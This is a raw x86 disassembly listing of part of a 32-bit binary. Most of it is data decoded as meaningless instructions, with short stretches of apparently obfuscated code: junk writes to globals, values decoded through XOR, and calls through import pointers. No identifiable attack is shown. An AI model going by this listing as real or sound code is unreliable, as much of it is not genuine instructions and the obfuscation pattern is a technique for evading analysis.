  404851:	pop    DWORD PTR ds:[edx]
  404854:	shl    DWORD PTR [esi-0x22baacfd],cl
  40485a:	mov    BYTE PTR [ecx],0xdb
  40485d:	pop    esp
  40485e:	rcl    DWORD PTR [ecx],1
  404860:	jns    0x404800
  404862:	mov    dh,0x43
  404864:	daa    
  404865:	add    eax,0x12216723
  40486a:	fstp   TBYTE PTR [esi]
  40486c:	dec    edi
  40486d:	loopne 0x40483c
  40486f:	xchg   esp,eax
  404870:	cdq    
  404871:	xor    al,ah
  404873:	jmp    0xc0425acd
  404878:	xchg   ecx,eax
  404879:	(bad)  
  40487b:	loopne 0x4048f9
  40487d:	sub    dh,dl
  40487f:	push   eax
  404880:	or     BYTE PTR [eax+edx*1],cl
  404883:	mov    DWORD PTR [ebx-0x5b],ebp
  404886:	sbb    esi,DWORD PTR [eax]
  404888:	mov    ecx,0xa800dc4a
  40488d:	pop    esp
  40488e:	pop    eax
  40488f:	sbb    eax,0xcd602fc9
  404894:	xor    eax,0x5b3c0f87
  404899:	shl    DWORD PTR es:[ecx-0x7e],cl
  40489d:	hlt    
  40489e:	adc    ch,dh
  4048a0:	cmp    BYTE PTR [ecx-0x3d],ch
  4048a3:	or     DWORD PTR [edx-0x1f6935fb],edi
  4048a9:	dec    ebx
  4048aa:	push   0xffffffa6
  4048ac:	mov    ecx,0x5e16e620
  4048b1:	sbb    al,0x7b
  4048b3:	mov    ds:0xe96f55d5,al
  4048b8:	jg     0x404896
  4048ba:	pop    ebp
  4048bb:	jbe    0x4048f4
  4048bd:	mov    ah,BYTE PTR [eax-0x34afa561]
  4048c3:	adc    dl,BYTE PTR [edi-0x2f623b20]
  4048c9:	sub    bl,al
  4048cb:	xor    eax,0xf487419d
  4048d0:	mov    eax,0x7138500a
  4048d5:	or     ebx,edx
  4048d7:	loope  0x40494d
  4048d9:	imul   esi,DWORD PTR [ebp-0x4f],0xffffffc4
  4048dd:	lahf   
  4048de:	adc    al,0xfa
  4048e0:	jle    0x404935
  4048e2:	xor    bh,BYTE PTR [ebx]
  4048e4:	retf   
  4048e5:	addr16 push 0x81633382
  4048eb:	(bad)  
  4048ec:	or     al,0x9f
  4048ee:	shl    DWORD PTR [edx],0x67
  4048f1:	das    
  4048f2:	jbe    0x4048b0
  4048f4:	sahf   
  4048f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4048f6:	daa    
  4048f7:	or     al,0x3c
  4048f9:	adc    eax,0xe4ca2078
  4048fe:	pop    eax
  4048ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404900:	fwait
  404901:	jmp    0x40488a
  404903:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404904:	inc    edx
  404905:	dec    ecx
  404906:	(bad)  
  404907:	xchg   ebx,eax
  404908:	dec    edx
  404909:	and    ecx,DWORD PTR [edi-0xc7e68ab]
  40490f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404910:	aaa    
  404911:	add    eax,0xefb43dd3
  404916:	pop    ds
  404917:	sub    DWORD PTR [ebx+0x549a8b38],0x178302f3
  404921:	jle    0x40491a
  404923:	xchg   ecx,eax
  404924:	mov    DWORD PTR [ebp-0x24],0xf89c85d8
  40492b:	mov    eax,DWORD PTR [ebp-0xc]
  40492e:	sbb    DWORD PTR ds:0x417e59,0x417e51
  404938:	xor    eax,esi
  40493a:	sub    DWORD PTR ds:0x41abde,0x4245ba
  404944:	jmp    0x404abd
  404949:	fst    QWORD PTR [ebx]
  40494b:	cdq    
  40494c:	loope  0x4049a7
  40494e:	jns    0x4049a5
  404950:	and    eax,esi
  404952:	scas   al,BYTE PTR es:[edi]
  404953:	pop    ss
  404954:	mov    BYTE PTR [bx+si],ch
  404957:	xchg   esp,eax
  404958:	imul   ebx,edx,0xda7e7e7f
  40495e:	jg     0x4049de
  404960:	jle    0x4048e2
  404962:	mov    cl,0x1c
  404964:	daa    
  404965:	mov    edx,0xbb9f4c88
  40496a:	jbe    0x4049ab
  40496c:	cmp    ecx,esp
  40496e:	sub    eax,0x90af55f5
  404973:	adc    ebp,DWORD PTR [esi-0x55ba6589]
  404979:	dec    esi
  40497a:	jmp    0x1b52:0x1edcc92b
  404981:	inc    ebx
  404982:	icebp  
  404983:	(bad)  
  404984:	push   ebx
  404985:	lahf   
  404986:	pop    ebp
  404987:	imul   ebx,edx,0xffffffbb
  40498a:	adc    al,0xe2
  40498c:	cmc    
  40498d:	sar    BYTE PTR [ebx],1
  40498f:	mov    esi,0x485a36d6
  404994:	xchg   DWORD PTR [edx],esi
  404996:	pop    ecx
  404997:	and    eax,0xf79d3b42
  40499c:	mov    eax,0xd7314cff
  4049a1:	into   
  4049a2:	ret    
  4049a3:	or     ebx,0x46
  4049a6:	and    dl,BYTE PTR [ecx-0x7f]
  4049a9:	mov    ebp,0x40c497b2
  4049ae:	aam    0xff
  4049b0:	sub    eax,eax
  4049b2:	mov    al,0x6f
  4049b4:	xchg   edi,eax
  4049b5:	pop    ds
  4049b6:	std    
  4049b7:	aam    0xed
  4049b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4049ba:	lock mov fs,WORD PTR [esi-0x40b17086]
  4049c1:	or     BYTE PTR [eax],ah
  4049c3:	jne    0x4049af
  4049c5:	jne    0x404994
  4049c7:	sbb    bh,bh
  4049c9:	xor    al,cl
  4049cb:	ret    
  4049cc:	out    0x29,al
  4049ce:	(bad)  
  4049cf:	iret   
  4049d0:	jbe    0x4049e3
  4049d2:	adc    DWORD PTR [ebp-0x2b],0xffffffad
  4049d6:	push   es
  4049d7:	adc    BYTE PTR [edx],bh
  4049d9:	mov    gs,WORD PTR [edi]
  4049db:	fs or  edx,0x23
  4049df:	arpl   WORD PTR [ecx+0x31],sp
  4049e2:	jmp    0xa1881a7a
  4049e7:	mov    eax,ds:0xd2902986
  4049ec:	aad    0x2a
  4049ee:	adc    eax,0xfd273fe1
  4049f3:	add    BYTE PTR [ebp-0x7b10caee],ch
  4049f9:	in     al,dx
  4049fa:	sub    al,BYTE PTR [ebx-0x3]
  4049fd:	mov    ah,0x2b
  4049ff:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  404a01:	mov    edx,0xf9ecdc4f
  404a06:	in     eax,0xe8
  404a08:	push   DWORD PTR ds:0x7a034d8f
  404a0e:	cmp    al,ch
  404a10:	pop    ecx
  404a11:	call   0xb0e1:0x26556633
  404a18:	mov    dh,0xbb
  404a1a:	stos   DWORD PTR es:[edi],eax
  404a1b:	aad    0x95
  404a1d:	pop    ss
  404a1e:	int    0x27
  404a20:	push   ds
  404a21:	or     eax,0xce21934c
  404a26:	sbb    DWORD PTR [eax],0x8820a54a
  404a2c:	push   cs
  404a2d:	add    ebp,DWORD PTR [ecx-0x77eb628d]
  404a33:	push   esi
  404a34:	push   edi
  404a35:	adc    BYTE PTR [edi+edi*2+0x2368cf58],al
  404a3c:	shr    DWORD PTR [ecx],0x66
  404a3f:	xor    ebp,eax
  404a41:	cmp    eax,DWORD PTR [ebp+0x3]
  404a44:	mov    dl,0xc4
  404a46:	jmp    0x8abd:0xbdb642ee
  404a4d:	test   al,0x34
  404a4f:	jae    0x404a9f
  404a51:	cld    
  404a52:	jmp    0x404ad3
  404a54:	add    ebp,DWORD PTR [edi+0x75198286]
  404a5a:	pop    esi
  404a5b:	aaa    
  404a5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404a5d:	mov    ebx,0xd2228b66
  404a62:	mov    dl,0x22
  404a64:	pop    ecx
  404a65:	pusha  
  404a66:	pop    es
  404a67:	cmp    esi,DWORD PTR [ecx+eax*4+0x61]
  404a6b:	mov    cl,0xd2
  404a6d:	mov    edi,0xc205ace3
  404a72:	xchg   ebp,eax
  404a73:	jns    0x404a89
  404a75:	fadd   DWORD PTR [edx+0x7]
  404a78:	out    0xf4,al
  404a7a:	outs   dx,DWORD PTR ds:[esi]
  404a7b:	xchg   DWORD PTR [eax],esp
  404a7d:	into   
  404a7e:	sbb    ch,bh
  404a80:	mov    ecx,0xaace5f66
  404a85:	mov    bl,0x9e
  404a87:	xor    bh,BYTE PTR [ebp+0x75]
  404a8a:	cmp    al,0x51
  404a8c:	cs and al,0xcb
  404a8f:	sbb    edi,DWORD PTR [edx-0x369a0512]
  404a95:	cmp    dl,BYTE PTR [edx+0x9]
  404a98:	dec    ebx
  404a99:	dec    ecx
  404a9a:	dec    ecx
  404a9b:	sub    eax,0x90a82b42
  404aa0:	aad    0x4d
  404aa2:	jb     0x404a93
  404aa4:	jae    0x404a5e
  404aa6:	pop    ss
  404aa7:	outs   dx,BYTE PTR ds:[esi]
  404aa8:	mov    edi,0xabd2723
  404aad:	jl     0x404b0a
  404aaf:	(bad)  
  404ab0:	arpl   WORD PTR [ebx-0xe],bx
  404ab3:	in     al,dx
  404ab4:	sbb    eax,0xc5457249
  404ab9:	push   ds
  404aba:	add    ch,BYTE PTR [eax+0x2d]
  404abd:	add    eax,edi
  404abf:	mov    DWORD PTR [ebp-0x18],eax
  404ac2:	and    DWORD PTR ds:0x4245ba,0x0
  404acc:	jmp    0x404adc
  404ad1:	mov    eax,ds:0x4245ba
  404ad6:	inc    eax
  404ad7:	mov    ds:0x4245ba,eax
  404adc:	cmp    DWORD PTR ds:0x4245ba,0x1e
  404ae3:	jae    0x404b28
  404ae9:	cmp    DWORD PTR ds:0x4245ba,0x6
  404af0:	jne    0x404b01
  404af6:	push   0x41ae97
  404afb:	call   DWORD PTR ds:0x40d1c4
  404b01:	cmp    DWORD PTR ds:0x4245ba,0x5
  404b08:	jne    0x404b19
  404b0e:	mov    eax,ds:0x4245ba
  404b13:	inc    eax
  404b14:	mov    ds:0x4245ba,eax
  404b19:	jmp    0x404ad1
  404b1e:	sub    DWORD PTR ds:0x415111,0xc33
  404b28:	mov    DWORD PTR [ebp-0x1c],0xf89c853f
  404b2f:	mov    BYTE PTR [ebp-0x1],0x57
  404b33:	sub    DWORD PTR ds:0x417e59,edi
  404b39:	mov    eax,DWORD PTR [ebp-0xc]
  404b3c:	xor    eax,esi
  404b3e:	and    DWORD PTR ds:0x415115,0x5145
  404b48:	add    eax,edi
  404b4a:	mov    DWORD PTR [ebp-0x18],eax
  404b4d:	mov    eax,DWORD PTR [ebp-0x24]
  404b50:	xor    eax,esi
  404b52:	adc    DWORD PTR ds:0x41abde,0x3f71
  404b5c:	add    eax,edi
  404b5e:	and    DWORD PTR ds:0x4245be,0x352e
  404b68:	push   eax
  404b69:	dec    eax
  404b6a:	mov    eax,DWORD PTR [ebp-0x28]
  404b6d:	xor    eax,esi
  404b6f:	and    DWORD PTR ds:0x4245b2,0x41abce
  404b79:	add    eax,edi
  404b7b:	xor    DWORD PTR ds:0x41abda,0x41237c
  404b85:	push   eax
  404b86:	and    DWORD PTR ds:0x4245be,0x41abe2
  404b90:	mov    eax,DWORD PTR [ebp-0x1c]
  404b93:	jmp    0x404d0c
  404b98:	push   0xffffff9c
  404b9a:	mov    ds:0x7b617853,al
  404b9f:	xchg   ebp,eax
  404ba0:	push   ebx
  404ba1:	mov    DWORD PTR [ecx+0x3f],esp
  404ba4:	iret   
  404ba5:	or     BYTE PTR [eax+0x4b],bl
  404ba8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404ba9:	jl     0x404c29
  404bab:	jle    0x404b87
  404bad:	jg     0x404c2d
  404baf:	jle    0x404bdd
  404bb1:	xchg   edx,eax
  404bb2:	fcom   QWORD PTR [esi+ebx*1-0x38dd405e]
  404bb9:	retf   
  404bba:	push   es
  404bbb:	and    ebp,ebx
  404bbd:	xor    ah,BYTE PTR [eax]
  404bbf:	fs jne 0x404c3c
  404bc2:	fdivp  st(2),st
  404bc4:	jmp    0x1f46fed7
  404bc9:	mov    esp,0x5e95be47
  404bce:	sbb    al,BYTE PTR [ecx]
  404bd0:	ja     0x404b9f
  404bd2:	ja     0x404bf4
  404bd4:	fcomp  DWORD PTR es:[eax-0x5737c943]
  404bdb:	(bad)  
  404bdc:	dec    edx
  404bdd:	aam    0x7b
  404bdf:	scas   eax,DWORD PTR es:[edi]
  404be0:	in     eax,dx
  404be1:	cwde   
  404be2:	iret   
  404be3:	jmp    0x4cb2:0xb04f17bc
  404bea:	mov    dl,0x82
  404bec:	cmp    BYTE PTR [eax],dl
  404bee:	shl    DWORD PTR [ebp-0x27],1
  404bf1:	push   ss
  404bf2:	stos   DWORD PTR es:[edi],eax
  404bf3:	and    ebp,DWORD PTR [edi-0x312963fc]
  404bf9:	mov    edx,0xbdb6f879
  404bfe:	test   BYTE PTR [ecx+esi*2],dh
  404c01:	pop    esp
  404c02:	ja     0x404c19
  404c04:	jg     0x404c27
  404c06:	xchg   ebx,eax
  404c07:	(bad)  
  404c08:	ret    
  404c09:	mov    ax,0xe2ff
  404c0d:	inc    edx
  404c0e:	iret   
  404c0f:	jae    0x404c2d
  404c11:	shr    bl,1
  404c13:	pop    eax
  404c14:	pop    ebp
  404c15:	mov    al,ds:0xf14b36f8
  404c1a:	cmc    
  404c1b:	push   edx
  404c1c:	sbb    ebx,ebp
  404c1e:	in     eax,0x3f
  404c20:	test   DWORD PTR [ecx-0x4e250de1],edi
  404c26:	jne    0x404bf1
  404c28:	inc    eax
  404c29:	scas   eax,DWORD PTR es:[edi]
  404c2a:	jmp    0x404bdf
  404c2c:	inc    esp
  404c2d:	jmp    0x404c0c
  404c2f:	pop    ebx
  404c30:	and    eax,0x670c8fec
  404c35:	(bad)  
  404c36:	icebp  
  404c37:	(bad)  
  404c39:	je     0x404c90
  404c3b:	mov    edi,0xb2e0e561
  404c40:	test   al,0x53
  404c42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404c43:	(bad)  
  404c44:	inc    DWORD PTR [ebx]
  404c46:	pop    ss
  404c47:	mov    bl,0x17
  404c49:	mov    esi,0x41d75572
  404c4e:	hlt    
  404c4f:	rcl    DWORD PTR [edi+ecx*4-0x6c],cl
  404c53:	push   cs
  404c54:	sahf   
  404c55:	mov    BYTE PTR [edi+0x5cff676b],cl
  404c5b:	outs   dx,BYTE PTR ds:[esi]
  404c5c:	lds    esi,FWORD PTR [edx-0x10]
  404c5f:	outs   dx,DWORD PTR ds:[esi]
  404c60:	aas    
  404c61:	sub    al,0xc4
  404c63:	aaa    
  404c64:	sbb    ch,BYTE PTR [eax-0x71]
  404c67:	hlt    
  404c68:	xlat   BYTE PTR ds:[ebx]
  404c69:	es add eax,ebp
  404c6c:	adc    edi,eax
  404c6e:	xchg   ebx,eax
  404c6f:	stos   BYTE PTR es:[edi],al
  404c70:	leave  
  404c71:	cmp    ebx,ebp
  404c73:	je     0x404c7c
  404c75:	adc    ebp,DWORD PTR [eax-0x5a]
  404c78:	arpl   WORD PTR ds:0xdd463717,di
  404c7e:	mov    al,ds:0x9ca856f3
  404c83:	lahf   
  404c84:	mov    al,BYTE PTR [edi+0x2311c61b]
  404c8a:	ror    esi,1
  404c8c:	bound  eax,QWORD PTR [esi+0x58]
  404c8f:	xchg   DWORD PTR [eax+eax*8+0x46],edx
  404c93:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404c94:	add    dl,BYTE PTR [di+0x69]
  404c98:	retf   0x2909
  404c9b:	push   edi
  404c9c:	imul   edx,DWORD PTR [ecx+0x77],0x42
  404ca0:	mov    al,0xea
  404ca2:	loop   0x404cea
  404ca4:	or     eax,0x13f2f565
  404ca9:	scas   al,BYTE PTR es:[edi]
  404caa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404cab:	or     dh,bh
  404cad:	rol    esp,1
  404caf:	cmp    al,0x19
  404cb1:	test   eax,0x7c96d21e
  404cb6:	sbb    DWORD PTR [edi],edi
  404cb8:	dec    esp
  404cb9:	in     al,0x75
  404cbb:	sub    bl,BYTE PTR [ebp-0x46]
  404cbe:	sub    DWORD PTR [ebp-0x77],ebp
  404cc1:	mov    eax,0xe8f2e0e4
  404cc6:	in     eax,0xa2
  404cc8:	retf   0x7f31
  404ccb:	xchg   edx,eax
  404ccc:	mov    bh,0x60
  404cce:	(bad)  [ebx+0x6e5adcd]
  404cd4:	xchg   BYTE PTR [esi+0x3e],dl
  404cd7:	in     al,dx
  404cd8:	push   0xffffffbb
  404cda:	add    al,BYTE PTR ds:0xfa56b99b
  404ce0:	push   edi
  404ce1:	shl    edi,0x1d
  404ce4:	dec    esp
  404ce5:	les    edx,FWORD PTR ds:0x8726d027
  404ceb:	cs fs add al,0x2f
  404cef:	test   eax,0xfbc145cd
  404cf4:	push   ss
  404cf5:	add    eax,0x43c37c9f
  404cfa:	sahf   
  404cfb:	xor    al,0x64
  404cfd:	shr    dl,0x7c
  404d00:	and    eax,0x3a0c0586
  404d05:	scas   al,BYTE PTR es:[edi]
  404d06:	imul   DWORD PTR [ecx+edi*2]
  404d09:	outs   dx,BYTE PTR ds:[esi]
  404d0a:	dec    edx
  404d0b:	mov    ecx,0x1df7c633
  404d10:	add    eax,0x3004151
  404d15:	mov    DWORD PTR [ecx+0x41236435],0x39b100
  404d1f:	add    BYTE PTR [eax-0x73],dl
  404d22:	inc    ebp
  404d23:	mov    BYTE PTR [eax-0x39],dl
  404d26:	add    eax,0x41237c
  404d2b:	push   edx
  404d2c:	add    BYTE PTR [bx+si],al
  404d2f:	push   DWORD PTR [ebp-0xc]
  404d32:	sub    DWORD PTR ds:0x415111,0x1b2b
  404d3c:	push   DWORD PTR [ebp-0x14]
  404d3f:	sub    DWORD PTR ds:0x4245b6,0x412364
  404d49:	call   0x409363
  404d4e:	inc    DWORD PTR ds:0x415119
  404d54:	test   eax,eax
  404d56:	mov    DWORD PTR ds:0x4245b6,0x71ec
  404d60:	je     0x404de0
  404d66:	sub    DWORD PTR ds:0x417e59,0x4245ca
  404d70:	lea    eax,[ebp-0x78]
  404d73:	neg    DWORD PTR ds:0x4245be
  404d79:	push   eax
  404d7a:	add    eax,DWORD PTR ds:0x4245ca
  404d80:	mov    eax,DWORD PTR [ebp-0x14]
  404d83:	and    DWORD PTR ds:0x417e59,0xd95
  404d8d:	xor    eax,esi
  404d8f:	add    eax,edi
  404d91:	and    DWORD PTR ds:0x417e3d,0x71b6
  404d9b:	push   eax
  404d9c:	mov    eax,DWORD PTR [ebp-0x10]
  404d9f:	add    eax,0xaa
  404da4:	push   eax
  404da5:	and    DWORD PTR ds:0x41abd2,0x17f4
  404daf:	mov    eax,DWORD PTR [ebp-0x10]
  404db2:	sub    DWORD PTR ds:0x417e55,0x41236c
  404dbc:	mov    eax,DWORD PTR [eax+0x198]
  404dc2:	push   DWORD PTR [eax]
  404dc4:	add    DWORD PTR ds:0x417e55,0x417e3d
  404dce:	call   0x40ae4d
  404dd3:	mov    DWORD PTR ds:0x41abd6,0x35a
  404ddd:	mov    DWORD PTR [ebp-0x8],eax
  404de0:	mov    DWORD PTR ds:0x412368,0x764e
  404dea:	cmp    DWORD PTR [ebp-0x8],0x0
  404dee:	not    DWORD PTR ds:0x412364
  404df4:	lea    eax,[ebp+0x4]
  404df7:	mov    DWORD PTR [ebp-0x20],eax
  404dfa:	je     0x405842
  404e00:	lea    eax,[ebp-0x18]
  404e03:	jmp    0x404f7c
  404e08:	ja     0x404d8f
  404e0a:	(bad)  
  404e0b:	je     0x404d9a
  404e0d:	je     0x404d94
  404e0f:	test   DWORD PTR [esi],edi
  404e11:	push   ebx
  404e12:	outs   dx,DWORD PTR ds:[esi]
  404e13:	jne    0x404dfe
  404e15:	popa   
  404e16:	(bad)  
  404e17:	jg     0x404e1b
  404e19:	jb     0x404e99
  404e1b:	jle    0x404df7
  404e1d:	jg     0x404e9d
  404e1f:	jle    0x404e8f
  404e21:	call   0xf331ee86
  404e26:	sbb    edx,ebx
  404e28:	sti    
  404e29:	retf   
  404e2a:	jo     0x404dc0
  404e2c:	xlat   BYTE PTR ds:[ebx]
  404e2d:	pop    ebp
  404e2e:	(bad)  
  404e2f:	pop    esi
  404e30:	add    DWORD PTR [ebp-0x58],eax
  404e33:	retf   0xec16
  404e36:	jbe    0x404e1b
  404e38:	adc    bl,BYTE PTR [eax+ecx*2-0x20]
  404e3c:	adc    DWORD PTR [edx+0x57ac6153],esp
  404e42:	mov    BYTE PTR [edi+0x478465ce],al
  404e48:	fdiv   st,st(5)
  404e4a:	jl     0x404ea8
  404e4c:	(bad)  
  404e4d:	sar    BYTE PTR ds:0x66d2d8cb,1
  404e53:	xchg   ebx,eax
  404e54:	nop
  404e55:	lock nop
  404e57:	and    eax,0xd40e7f1e
  404e5c:	mov    al,es:0xe6550072
  404e62:	and    eax,ecx
  404e64:	xor    dl,BYTE PTR [edi-0x54f07f97]
  404e6a:	sub    dl,ah
  404e6c:	cmp    bl,0x70
  404e6f:	cs leave 
  404e71:	ds xchg ebp,eax
  404e73:	xchg   edi,eax
  404e74:	popa   
  404e75:	jge    0x404edd
  404e77:	std    
  404e78:	push   edi
  404e79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404e7a:	pop    edi
  404e7b:	jne    0x404e2f
  404e7d:	pop    ds
  404e7e:	xor    al,0xaf
  404e80:	jmp    0x404efa
  404e82:	or     eax,0x564e4bb4
  404e87:	(bad)  
  404e88:	jmp    0x404ed8
  404e8a:	inc    DWORD PTR [edi+0xeb83c9b]
  404e90:	loopne 0x404e24
  404e92:	fisubr DWORD PTR [ebx]
  404e94:	fscale 
  404e96:	or     ah,BYTE PTR [ebx]
  404e98:	lods   eax,DWORD PTR ds:[esi]
  404e99:	dec    edi
  404e9a:	mov    ecx,0x3d9577b0
  404e9f:	int    0x84
  404ea1:	mov    ebx,0xfff624f4
  404ea6:	and    al,0xa
  404ea8:	or     eax,0x572ed657
  404ead:	sub    eax,0x1a9ea3ce
  404eb2:	add    DWORD PTR ds:0x9e5b3f23,ebx
  404eb8:	dec    ecx
  404eb9:	add    ah,dh
  404ebb:	jnp    0x404efd
  404ebd:	jno    0x404ee2
  404ebf:	js     0x404ecc
  404ec1:	sbb    al,BYTE PTR [edx-0x4f]
  404ec4:	inc    eax
  404ec5:	les    esp,FWORD PTR [ebp-0x18ff9f0b]
  404ecb:	push   ss
  404ecc:	push   es
  404ecd:	pop    eax
  404ece:	xchg   dh,bl
  404ed0:	aaa    
  404ed1:	add    ah,BYTE PTR [edi+ebx*1-0x47]
  404ed5:	sub    al,0xea
  404ed7:	sbb    DWORD PTR [ecx],edx
  404ed9:	dec    edx
  404eda:	and    dh,BYTE PTR [ecx+0x31]
  404edd:	mov    edx,0xf964b4d4
  404ee2:	repz inc eax
  404ee4:	aad    0x1f
  404ee6:	mov    bh,0x8
  404ee8:	enter  0x1eb3,0x7f
  404eec:	and    ah,BYTE PTR [ecx+edx*2]
  404eef:	sbb    esp,DWORD PTR [ebx+0x52d3c2bb]
  404ef5:	pop    ebx
  404ef6:	xchg   ecx,eax
  404ef7:	pop    DWORD PTR ds:[eax-0x25]
  404efb:	mul    al
  404efd:	int    0x38
  404eff:	pop    edi
  404f00:	cmp    bh,BYTE PTR [edi-0x2f]
  404f03:	cmp    ebp,DWORD PTR [ecx-0xf]
  404f06:	pop    ds
  404f07:	mov    ebp,DWORD PTR [eax]
  404f09:	dec    ecx
  404f0a:	dec    eax
  404f0b:	and    al,0xd0
  404f0d:	(bad)  
  404f0f:	fucomp st(3)
  404f11:	outs   dx,DWORD PTR ds:[esi]
  404f12:	xor    eax,0x16501a16
  404f17:	in     eax,0xb0
  404f19:	addr16 test eax,0x55cec6f0
  404f1f:	push   ds
  404f20:	pusha  
  404f21:	out    dx,eax
  404f22:	aad    0x37
  404f24:	in     eax,dx
  404f25:	jle    0x404f38
  404f27:	out    dx,eax
  404f28:	sub    DWORD PTR [eax+0x62e14f56],edi
  404f2e:	push   eax
  404f2f:	stc    
  404f30:	push   cs
  404f31:	shr    al,1
  404f33:	lods   eax,DWORD PTR ds:[esi]
  404f34:	repz or al,0x3b
  404f37:	xchg   DWORD PTR [ecx+ebx*4-0x7a49ca04],edx
  404f3e:	and    ch,dl
  404f40:	loope  0x404f21
  404f42:	jo     0x404f49
  404f44:	jecxz  0x404f5c
  404f46:	jle    0x404f8f
  404f48:	idiv   DWORD PTR [edi+0x65ebf4b8]
  404f4e:	lahf   
  404f4f:	xchg   ebp,eax
  404f50:	dec    edx
  404f51:	add    esi,ebx
  404f53:	xchg   esi,eax
  404f54:	(bad)  
  404f55:	stos   BYTE PTR es:[edi],al
  404f56:	push   edi
  404f57:	add    al,ch
  404f59:	mov    BYTE PTR [ecx-0x7],cl
  404f5c:	int    0xf
  404f5e:	add    eax,0xff110d1
  404f63:	push   ss
  404f64:	pushf  
  404f65:	retf   
  404f66:	sub    eax,0x135612f
  404f6b:	push   ebx
  404f6c:	inc    ebp
  404f6d:	test   DWORD PTR [edx],0x5afcc8f1
  404f73:	mov    ds:0x1a2d2a2,al
  404f78:	jmp    0x404fa5
  404f7a:	fbstp  TBYTE PTR [edx-0x51da7eb0]
  404f80:	inc    ebp
  404f81:	inc    edx
  404f82:	add    BYTE PTR [eax],al
  404f84:	add    BYTE PTR [eax],al
  404f86:	add    cl,ch
  404f88:	or     eax,DWORD PTR [eax]
  404f8a:	add    BYTE PTR [eax],al
  404f8c:	mov    eax,ds:0x4245ae
  404f91:	inc    eax
  404f92:	mov    ds:0x4245ae,eax
  404f97:	cmp    DWORD PTR ds:0x4245ae,0x1e
  404f9e:	jae    0x404fc0
  404fa4:	cmp    DWORD PTR ds:0x4245ae,0x22
  404fab:	jne    0x404fba
  404fb1:	push   DWORD PTR [ebp-0x28]
  404fb4:	call   DWORD PTR ds:0x40d298
  404fba:	jmp    0x404f8c
  404fbf:	inc    eax
  404fc0:	mov    eax,DWORD PTR [ebp-0x2c]
  404fc3:	adc    DWORD PTR ds:0x412354,0x412370
  404fcd:	xor    eax,esi
  404fcf:	add    eax,edi
  404fd1:	and    DWORD PTR ds:0x415115,0x3c83
  404fdb:	jmp    0x405154
  404fe0:	adc    al,0x10
  404fe2:	imul   DWORD PTR [edx]
  404fe4:	mov    ebp,DWORD PTR [ecx+0x1f8510a9]
  404fea:	and    DWORD PTR [edx+0xab5c7be],esi
  404ff0:	out    dx,al
  404ff1:	jae    0x405071
  404ff3:	jle    0x404fcf
  404ff5:	jg     0x405075
  404ff7:	jle    0x40503b
  404ff9:	jns    0x405001
  404ffb:	das    
  404ffc:	xchg   ecx,eax
  404ffd:	push   es
  404ffe:	gs jo  0x404fb2
  405001:	add    dl,BYTE PTR [edx]
  405003:	or     al,0x30
  405005:	xchg   edx,eax
  405006:	mov    edx,0x25bd1925
  40500b:	pop    eax
  40500c:	xor    eax,0xeacb909e
  405011:	(bad)  
  405012:	out    dx,al
  405013:	inc    ebp
  405014:	out    0x39,eax
  405016:	jp     0x405013
  405018:	into   
  405019:	iret   
  40501a:	mov    BYTE PTR [edx-0x60d0945f],dl
  405020:	push   ebx
  405021:	cwde   
  405022:	repnz push edi
  405024:	xchg   ecx,eax
  405025:	int3   
  405026:	xchg   ecx,eax
  405027:	and    cl,BYTE PTR [edi]
  405029:	pop    es
  40502a:	popa   
  40502b:	add    DWORD PTR [edi],edx
  40502d:	sub    BYTE PTR [ebx+0x61b5d7a],ch
  405033:	xchg   BYTE PTR [eax+0x5e],bh
  405036:	sbb    DWORD PTR [ebx],ebp
  405038:	cdq    
  405039:	scas   al,BYTE PTR es:[edi]
  40503a:	push   eax
  40503b:	cmp    BYTE PTR [ecx],dh
  40503d:	xlat   BYTE PTR ds:[ebx]
  40503e:	test   BYTE PTR [esi-0x6bf48574],0x18
  405045:	pop    eax
  405046:	push   esp
  405047:	xor    esp,DWORD PTR [ebp-0x20]
  40504a:	cdq    
  40504b:	push   eax
  40504c:	ret    0xbb
  40504f:	push   ebp
  405050:	scas   al,BYTE PTR es:[edi]
  405051:	jmp    0x2666:0xfd9f9f01
  405058:	sbb    ecx,DWORD PTR [edx]
  40505a:	jo     0x405056
  40505c:	push   ebp
  40505d:	xchg   esp,eax
  40505e:	(bad)  
  40505f:	(bad)  
  405060:	fs es jmp 0x2a50:0xb7ca0e25
  405069:	(bad)  [ebx-0x4c]
  40506c:	fild   DWORD PTR [esi-0x22b0486e]
  405072:	push   ss
  405073:	and    DWORD PTR [ebx],esp
  405075:	les    eax,FWORD PTR [ebx-0x76]
  405078:	mov    esp,0x605acf0c
  40507d:	sbb    eax,eax
  40507f:	aaa    
  405080:	fidivr WORD PTR [ecx+esi*4-0x7e92a018]
  405087:	xchg   esp,eax
  405088:	jnp    0x4050bc
  40508a:	jbe    0x40508e
  40508c:	push   es
  40508d:	xor    esp,DWORD PTR gs:[ebx]
  405090:	hlt    
  405091:	push   ebp
  405092:	jbe    0x4050ed
  405094:	inc    edx
  405095:	xor    bl,bl
  405097:	mov    eax,0xaee50319
  40509c:	(bad)  
  40509d:	aas    
  40509e:	xor    BYTE PTR [edx+0x2160a446],ah
  4050a4:	cld    
  4050a5:	mov    BYTE PTR [eax],dl
  4050a7:	sub    ebp,0x1a8a372f
  4050ad:	xchg   ebx,eax
  4050ae:	loope  0x405068
  4050b0:	add    dh,bh
  4050b2:	adc    bl,bh
  4050b4:	inc    bx
  4050b6:	hlt    
  4050b7:	adc    esp,edx
  4050b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4050ba:	push   esp
  4050bb:	fild   DWORD PTR [eax+eiz*2+0x28094efa]
  4050c2:	and    eax,0x5e530876
  4050c7:	enter  0x34aa,0x51
  4050cb:	mov    BYTE PTR [eax+0x21],al
  4050ce:	das    
  4050cf:	xor    ah,BYTE PTR [ebx-0x4c2993e4]
  4050d5:	add    bl,BYTE PTR [ebp+0x4e]
  4050d8:	sub    al,0x27
  4050da:	pop    eax
